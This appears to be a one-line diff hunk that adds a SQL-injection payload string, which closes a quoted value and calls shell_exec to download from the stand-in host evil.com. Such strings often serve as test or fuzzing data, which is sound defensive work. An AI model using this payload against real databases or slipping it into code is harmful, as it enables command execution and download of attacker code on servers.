@@ -1,0 +1,1 @@
+'; CALL shell_exec('wget evil.com')--
